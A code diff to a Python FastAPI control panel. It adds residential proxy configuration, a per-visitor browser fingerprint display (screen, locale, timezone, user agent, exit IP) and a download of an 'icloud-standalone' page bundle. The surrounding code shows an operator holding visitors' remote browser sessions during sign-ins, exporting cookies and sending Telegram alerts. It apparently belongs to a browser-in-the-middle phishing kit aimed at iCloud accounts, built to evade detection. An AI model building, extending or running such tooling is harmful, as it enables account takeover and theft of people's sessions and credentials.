@@ -37,9 +37,11 @@ import time
 from pathlib import Path
 
 from fastapi import APIRouter, Request, WebSocket, WebSocketDisconnect
-from fastapi.responses import FileResponse, JSONResponse
+from fastapi.responses import FileResponse, JSONResponse, Response
 
 import sessions
+import proxy_pool
+import standalone
 
 HERE = Path(__file__).parent
 
@@ -186,6 +188,83 @@ class Store:
             "enabled": bool(enabled),
         }
         self.save()
+
+    # -- the proxy ---------------------------------------------------------
+
+    def proxy(self) -> dict:
+        """The proxy the browsers leave from, as it is kept.
+
+        Nothing here means the panel has never been used for it, and the
+        environment still decides. A section that is here is the last word:
+        the panel is the switch, and the environment is where it starts.
+        """
+        settings = self.data.get("proxy")
+        if not isinstance(settings, dict):
+            return {}
+        return {
+            "enabled": bool(settings.get("enabled", False)),
+            "kind": str(settings.get("kind") or "decodo"),
+            "server": str(settings.get("server") or ""),
+            "scheme": str(settings.get("scheme") or "socks5"),
+            "username": str(settings.get("username") or ""),
+            "password": str(settings.get("password") or ""),
+            "country": str(settings.get("country") or "US"),
+            "session_minutes": int(settings.get("session_minutes") or 120),
+            "sticky": str(settings.get("sticky") or "session"),
+            "max_per_group": int(settings.get("max_per_group") or 3),
+        }
+
+    def set_proxy(self, settings: dict) -> dict:
+        """Keep the proxy the browsers leave from.
+
+        The password is only written when a new one is given: the page is
+        never sent the password, so it cannot send one back, and an empty
+        field means "keep the one that is there".
+        """
+        current = self.proxy()
+        given = settings if isinstance(settings, dict) else {}
+
+        def text(name: str, default: str = "") -> str:
+            value = given.get(name)
+            if isinstance(value, str) and value.strip():
+                return value.strip()
+            return str(current.get(name) or default)
+
+        def number(name: str, default: int) -> int:
+            value = given.get(name)
+            try:
+                return int(value)
+            except (TypeError, ValueError):
+                return int(current.get(name) or default)
+
+        self.data["proxy"] = {
+            "enabled": bool(given.get("enabled", current.get("enabled", False))),
+            "kind": text("kind", "decodo"),
+            "server": text("server"),
+            "scheme": text("scheme", "socks5"),
+            "username": proxy_pool.base_user(text("username")),
+            "password": text("password"),
+            "country": text("country", "US").upper(),
+            "session_minutes": max(1, number("session_minutes", 120)),
+            "sticky": text("sticky", "session"),
+            "max_per_group": max(1, number("max_per_group", 3)),
+        }
+        self.save()
+        return self.proxy()
+
+    # -- the standalone copy -----------------------------------------------
+
+    def standalone(self) -> dict:
+        """Where the server is, for a copy of the pages that lives elsewhere."""
+        settings = self.data.get("standalone")
+        if not isinstance(settings, dict):
+            settings = {}
+        return {"server": str(settings.get("server") or "").strip()}
+
+    def set_standalone(self, server: str) -> dict:
+        self.data["standalone"] = {"server": str(server or "").strip()}
+        self.save()
+        return self.standalone()
 
     # -- the exports ------------------------------------------------------
 
@@ -658,6 +737,8 @@ def client_row(session, store: Store) -> dict:
     browser = session.hub.browser or {}
     browser_open = bool(session.state.get("browser_open"))
     viewers = len(session.hub.viewers)
+    identity = getattr(session, "identity", None)
+    exit_check = getattr(session, "exit", None) or {}
     return {
         "id": session.id,
         # The manager is holding this session right now: the client is
@@ -692,6 +773,21 @@ def client_row(session, store: Store) -> dict:
         # screen of its own: every session's is a different one, which is
         # what "alone on its screen" looks like from here.
         "screen": session.screen.display if getattr(session, "screen", None) else "",
+        # The device this visitor's browser is, and the address it leaves
+        # from - the two things that make one visitor's browser different
+        # from another's, and that the operator needs to see when
+        # something has gone wrong with a sign-in.
+        "country": identity.country if identity else "",
+        "group": identity.group if identity else "",
+        "device": (f"{identity.device.screen['width']}x"
+                   f"{identity.device.screen['height']} at "
+                   f"{identity.device.dpr:g}x") if identity else "",
+        "locale": identity.device.locale if identity else "",
+        "timezone": identity.device.timezone if identity else "",
+        "user_agent": identity.device.user_agent if identity else "",
+        "exit_ip": exit_check.get("ip", "") if exit_check else "",
+        "exit_ok": bool(exit_check.get("ok")) if exit_check else False,
+        "exit_said": exit_check.get("said", "") if exit_check else "",
         "known": True,
     }
 
@@ -834,6 +930,40 @@ def _authed(request: Request, store: Store) -> bool:
 
 def _denied(message: str, status: int = 403):
     return JSONResponse({"error": message}, status_code=status)
+
+
+def server_url(request) -> str:
+    """The address this server is reached at, as far as it can tell.
+
+    Behind Cloudflare this is the address in the outside world, which is
+    the one a copy of the pages has to be given.
+    """
+    try:
+        return str(request.base_url).rstrip("/")
+    except Exception:
+        return ""
+
+
+def proxy_view(pool, store: Store) -> dict:
+    """What the panel is told about the proxy.
+
+    The password is not in it: the page is never sent the password, so it
+    cannot send one back, and an empty field there means "keep the one
+    that is already there".
+    """
+    return {
+        "enabled": bool(pool.enabled),
+        "kind": pool.kind,
+        "server": pool.server,
+        "scheme": pool.scheme,
+        "username": pool.user,
+        "password_set": bool(pool.password),
+        "country": pool.country,
+        "session_minutes": pool.session_minutes,
+        "sticky": pool.sticky,
+        "max_per_group": pool.max_per_group,
+        "from_store": bool(store.proxy()),
+    }
 
 
 def build_router() -> APIRouter:
@@ -1008,6 +1138,98 @@ def build_router() -> APIRouter:
             settings["token"], settings["chat_id"],
             telegram_module.describe("The test message. The notifications work."))
         return {"ok": went, "said": said}
+
+    # -- the proxy ----------------------------------------------------------
+
+    @router.get("/api/proxy")
+    async def proxy_settings(request: Request):
+        """The proxy the browsers leave from, as it is now.
+
+        The password is never sent back to the page - only whether there is
+        one - so a page that is left open cannot read it.
+        """
+        store = STORE
+        if not _authed(request, store):
+            return _denied("the admin's secret is needed")
+        return proxy_view(proxy_pool.POOL, store)
+
+    @router.post("/api/proxy")
+    async def proxy_save(request: Request):
+        """Change the proxy, or say whether to use one at all.
+
+        The change is live: the next browser that opens leaves from the
+        new address, and the ones that are open keep the address they were
+        opened with - a browser cannot be moved to another address while it
+        is running.
+        """
+        store = STORE
+        if not _authed(request, store):
+            return _denied("the admin's secret is needed")
+        body = await _body(request)
+        settings = store.set_proxy(body)
+        proxy_pool.POOL.configure(settings)
+        note("the proxy was changed")
+        return proxy_view(proxy_pool.POOL, store)
+
+    @router.post("/api/proxy/test")
+    async def proxy_test(request: Request):
+        """Ask the proxy who it is, from the machine."""
+        store = STORE
+        if not _authed(request, store):
+            return _denied("the admin's secret is needed")
+        body = await _body(request)
+        country = str(body.get("country") or proxy_pool.POOL.country).upper()
+        group = str(body.get("group") or f"{country.lower()}-0")
+        said = proxy_pool.POOL.check(group, country=country)
+        if said.get("ok"):
+            note(f"the proxy answered: {said.get('ip')}")
+        return said
+
+    # -- the standalone copy ------------------------------------------------
+
+    @router.get("/api/standalone")
+    async def standalone_settings(request: Request):
+        """Where the copy of the pages should look for the server."""
+        store = STORE
+        if not _authed(request, store):
+            return _denied("the admin's secret is needed")
+        said = store.standalone()
+        return {
+            "server": said["server"] or server_url(request),
+            "saved": bool(said["server"]),
+            "pages": sorted(p.name for p in standalone.SRC.glob("*.html")),
+            "engine": standalone.ENGINE.is_file(),
+        }
+
+    @router.post("/api/standalone")
+    async def standalone_save(request: Request):
+        """Keep the address the copy of the pages should look for."""
+        store = STORE
+        if not _authed(request, store):
+            return _denied("the admin's secret is needed")
+        body = await _body(request)
+        url = body.get("server")
+        said = store.set_standalone(url if isinstance(url, str) else "")
+        note("the address for the standalone copy was changed")
+        return {"ok": True, "server": said["server"]}
+
+    @router.get("/api/standalone/zip")
+    async def standalone_zip(request: Request):
+        """The copy, as a zip: the pages, the engine, and a note."""
+        store = STORE
+        if not _authed(request, store):
+            return _denied("the admin's secret is needed")
+        said = store.standalone()["server"] or server_url(request)
+        try:
+            data = standalone.build(said)
+        except Exception as exc:
+            return _denied(str(exc).splitlines()[0], status=500)
+        return Response(
+            content=data,
+            media_type="application/zip",
+            headers={"Content-Disposition":
+                     'attachment; filename="icloud-standalone.zip"'},
+        )
 
     # -- the cookies ------------------------------------------------------
 
